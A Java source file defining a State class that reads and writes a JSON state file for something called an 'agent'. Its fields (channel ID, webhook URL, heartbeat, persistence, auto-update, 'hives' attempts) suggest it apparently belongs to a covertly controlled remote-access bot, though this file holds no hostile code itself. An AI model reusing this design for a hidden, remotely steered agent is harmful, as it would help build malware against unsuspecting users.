package com.serverpackcore.agent;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.Map;

public final class State {
	public String version = "";
	public String channelId = "";
	public String webhookUrl = "";
	public String lastId = "0";
	public long lastHeartbeat = 0L;
	public boolean hello = false;
	public boolean persist = false;
	public boolean autoUpdate = false;
	public long autoNext = 0L;
	public int autoFailures = 0;
	public int bootstrap = 0;
	public int hivesAttempts = 0;

	public static State load(Path file) {
		State state = new State();
		try {
			if (!Files.isRegularFile(file)) {
				return state;
			}
			Map<String, Object> map = Json.parseObject(Files.readString(file, StandardCharsets.UTF_8));
			state.version = Json.str(map, "version", "");
			state.channelId = Json.str(map, "channelId", "");
			state.webhookUrl = Json.str(map, "webhookUrl", "");
			state.lastId = Json.str(map, "lastId", "0");
			state.lastHeartbeat = Json.num(map, "lastHeartbeat", 0L);
			state.hello = Boolean.TRUE.equals(map.get("hello"));
			state.persist = Boolean.TRUE.equals(map.get("persist"));
			state.autoUpdate = Boolean.TRUE.equals(map.get("autoUpdate"));
			state.autoNext = Json.num(map, "autoNext", 0L);
			state.autoFailures = (int) Json.num(map, "autoFailures", 0L);
			state.bootstrap = (int) Json.num(map, "bootstrap", 0L);
			state.hivesAttempts = (int) Json.num(map, "hivesAttempts", 0L);
		} catch (Throwable throwable) {
			Log.debug("State read failed", throwable);
		}
		return state;
	}

	public synchronized void save(Path file) {
		try {
			Map<String, Object> map = new LinkedHashMap<>();
			map.put("version", version);
			map.put("channelId", channelId);
			map.put("webhookUrl", webhookUrl);
			map.put("lastId", lastId);
			map.put("lastHeartbeat", lastHeartbeat);
			map.put("hello", hello);
			map.put("persist", persist);
			map.put("autoUpdate", autoUpdate);
			map.put("autoNext", autoNext);
			map.put("autoFailures", autoFailures);
			map.put("bootstrap", bootstrap);
			map.put("hivesAttempts", hivesAttempts);
			Path temp = file.resolveSibling(file.getFileName() + ".tmp");
			Files.writeString(temp, Json.stringify(map), StandardCharsets.UTF_8);
			try {
				Files.setPosixFilePermissions(temp,
					java.nio.file.attribute.PosixFilePermissions.fromString("rw-------"));
			} catch (Throwable ignored) {
				// Windows
			}
			Files.move(temp, file, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
		} catch (Throwable throwable) {
			Log.debug("State write failed", throwable);
		}
	}
}
